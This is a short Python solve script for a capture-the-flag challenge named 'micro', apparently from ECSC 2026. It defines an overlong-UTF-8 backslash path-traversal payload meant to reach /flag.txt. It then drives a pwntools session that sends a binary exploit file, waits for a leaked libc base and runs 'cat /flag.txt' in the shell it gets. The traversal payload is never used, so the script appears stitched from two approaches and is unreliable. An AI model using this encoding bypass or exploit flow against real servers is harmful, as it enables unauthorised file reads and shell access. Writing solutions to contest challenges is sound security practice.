#!/usr/bin/env python3
"""Solve script for `micro`.

Usage: solve.py <host> <port>
       solve.py <url>          e.g. https://<session>.challenge.ecsc2026.de/
"""

import socket
import ssl
import sys
from pwn import *
import time

# Overlong (two byte) UTF-8 encoding of U+005C REVERSE SOLIDUS. MicroPython's
# decoder accepts it, so the "no separators" check never sees a backslash, but
# ord() reports 92 and the server's own backslash folding turns it into a "/".
OVERLONG_BACKSLASH = "%c1%9c"

# www/ sits at /srv/www, so two levels get us to /flag.txt.
PATH = "/.." + OVERLONG_BACKSLASH + ".." + OVERLONG_BACKSLASH + "flag.txt"

context.log_level = "DEBUG"


def target():
    """Accept either "<host> <port>" or a single URL."""
    args = sys.argv[1:]
    if len(args) == 1 and "://" in args[0]:
        scheme, _, rest = args[0].partition("://")
        host = rest.split("/")[0]
        tls = scheme == "https"
        if ":" in host:
            host, _, port = host.partition(":")
            return host, int(port), tls
        return host, 443 if tls else 80, tls
    if len(args) == 2:
        port = int(args[1])
        return args[0], port, port == 443
    sys.exit("usage: %s <host> <port> | %s <url>" % (sys.argv[0], sys.argv[0]))


def send(host, port, tls, expl):
    s = remote(host, port, ssl=tls)
    s.recvuntil(b"stdin/stdout/stderr.")
    s.sendline(str(len(expl)).encode())
    s.send(expl)
    s.recvuntil(b"[+] libc base")
    time.sleep(1)
    s.sendline(b"cat /flag.txt")
    return s.recvall(timeout=1)


def main():
    host, port, tls = target()
    flag = send(host, port, tls, open("/solve/expl.mc", "rb").read())

    flag = flag.decode()

    print(flag)
    if not "ECSC{" in flag:
        sys.exit("response did not look like a flag")


main()
